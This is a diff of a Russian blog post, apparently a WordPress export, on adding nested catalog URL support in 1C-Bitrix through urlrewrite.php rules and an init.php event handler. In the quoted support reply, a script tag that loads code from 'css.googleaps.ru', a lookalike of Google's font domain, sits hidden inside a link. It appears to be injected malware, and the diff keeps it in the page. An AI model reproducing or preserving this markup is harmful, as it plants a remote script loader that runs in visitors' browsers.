@@ -12,7 +12,7 @@ author_login: admin
 author_email: maxycws@gmail.com
 excerpt: "На днях потребовалось выполнить интернет магазин со сложной структурой каталога.
   Увидел такую интересную вещь как #SECTION_CODE_PATH#. Эта \"переменная\" хранит
-  в себе иерархическую информацию от корня сайта до текущей категории: site.ru&#47;catalog&#47;section&#47;subsection&#47;subsection&#47;subsubsection&#47;\r\n\r\nНа
+  в себе иерархическую информацию от корня сайта до текущей категории: site.ru/catalog/section/subsection/subsection/subsubsection/\r\n\r\nНа
   странице я использовал простые компоненты, такие как bitrix:catalog.section и bitrix:catalog.section.list\r\n\r\nКак
   оказалось, переменную SECTION_CODE_PATH поддерживают только комплексные компоненты.\r\n\r\n"
 wordpress_id: 210
@@ -30,38 +30,38 @@ tags:
 - битрикс
 comments: []
 ---
-<p>На днях потребовалось выполнить интернет магазин со сложной структурой каталога. Увидел такую интересную вещь как #SECTION_CODE_PATH#. Эта "переменная" хранит в себе иерархическую информацию от корня сайта до текущей категории: site.ru&#47;catalog&#47;section&#47;subsection&#47;subsection&#47;subsubsection&#47;</p>
+<p>На днях потребовалось выполнить интернет магазин со сложной структурой каталога. Увидел такую интересную вещь как #SECTION_CODE_PATH#. Эта "переменная" хранит в себе иерархическую информацию от корня сайта до текущей категории: site.ru/catalog/section/subsection/subsection/subsubsection/</p>
 <p>На странице я использовал простые компоненты, такие как bitrix:catalog.section и bitrix:catalog.section.list</p>
 <p>Как оказалось, переменную SECTION_CODE_PATH поддерживают только комплексные компоненты.</p>
 <p><a id="more"></a><a id="more-210"></a></p>
 <blockquote><p>На данный момент поддержка вложенных ЧПУ в модуле Информационные блоки реализована только для комплексных компонентов catalog, news и photo.<br />
-<a href="http:&#47;&#47;dev.1c-bitrix.ru&#47;learning&#47;course&#47;index.php?COURSE_ID=35&amp;LESSON_ID=5319&amp;LESSON_PATH=3906.4485.5319">http:&#47;&#47;dev.1c-bitrix.ru&#47;learning&#47;course&#47;index.php?COURSE_ID=35&amp;LESSON_ID=5319&amp;LESSON_PATH=3906.4485.5319<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;a></p>
+<a href="http://dev.1c-bitrix.ru/learning/course/index.php?COURSE_ID=35&amp;LESSON_ID=5319&amp;LESSON_PATH=3906.4485.5319">http://dev.1c-bitrix.ru/learning/course/index.php?COURSE_ID=35&amp;LESSON_ID=5319&amp;LESSON_PATH=3906.4485.5319<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></a></p>
 <p>С уважением,<br />
 сотрудник технической поддержки<br />
-Дмитрий.<&#47;blockquote><br />
+Дмитрий.</blockquote><br />
 Ну чтож, давайте реализуем поддержку сами, раз разработчикам это так сложно.</p>
 <p>За маршрутизацию запросов на сайте отвечает файл urlrewrite.php. Добавим в него такие строки:</p>
 <pre class="brush: php; gutter: true">    array(<br />
-        "CONDITION" => '#^&#47;catalog&#47;([&#47;-_.a-zA-Z0-9]+)&#47;#',<br />
+        "CONDITION" => '#^/catalog/([/-_.a-zA-Z0-9]+)/#',<br />
         "RULE" => "SECTION_PATH=$1&amp;$2",<br />
         "ID" => "bitrix:catalog.section",<br />
-        "PATH" => "&#47;catalog&#47;index.php",<br />
+        "PATH" => "/catalog/index.php",<br />
     ),<br />
     array(<br />
-        "CONDITION" => "#^&#47;catalog&#47;#",<br />
+        "CONDITION" => "#^/catalog/#",<br />
         "RULE" => "",<br />
         "ID" => "bitrix:catalog.section",<br />
-        "PATH" => "&#47;catalog&#47;index.php",<br />
+        "PATH" => "/catalog/index.php",<br />
     ),<br />
-<&#47;pre><br />
+</pre><br />
 В первом правиле мы указываем на ссылку указывающую на конкретную категорию с полным или частичным путем к нему. Второе правило указывает на индексную страницу каталога.</p>
 <p>В битриксе есть также файл</p>
-<pre class="brush: text; gutter: true">bitrix&#47;php_interface&#47;init.php<&#47;pre><br />
+<pre class="brush: text; gutter: true">bitrix/php_interface/init.php</pre><br />
 Добавим в него событие на запуск функции перед выполнением компонентов:</p>
 <pre class="brush: php; gutter: true">AddEventHandler("main",'OnProlog','setCurrentSectioCodeBySectionCodePath');</p>
 <p>function setCurrentSectioCodeBySectionCodePath(){<br />
-     $path = explode('&#47;', $_REQUEST['SECTION_PATH']);<br />
+     $path = explode('/', $_REQUEST['SECTION_PATH']);<br />
      $_REQUEST['SECTION_CODE'] = array_pop($path);<br />
-}<&#47;pre><br />
-В данной функции наши пути разбиваются по знаку &#47; и выбирается последний. Он то и является SECTION_CODE.</p>
-<p>Данное решение было предложено на сайте 1с-Битрикс <a href="http:&#47;&#47;dev.1c-bitrix.ru&#47;community&#47;forums&#47;messages&#47;forum6&#47;topic60295&#47;message315855&#47;#message315855" target="_blank" rel="nofollow">Рамилем Юналиевым<&#47;a>, а мною уже доработано.</p>
+}</pre><br />
+В данной функции наши пути разбиваются по знаку / и выбирается последний. Он то и является SECTION_CODE.</p>
+<p>Данное решение было предложено на сайте 1с-Битрикс <a href="http://dev.1c-bitrix.ru/community/forums/messages/forum6/topic60295/message315855/#message315855" target="_blank" rel="nofollow">Рамилем Юналиевым</a>, а мною уже доработано.</p>
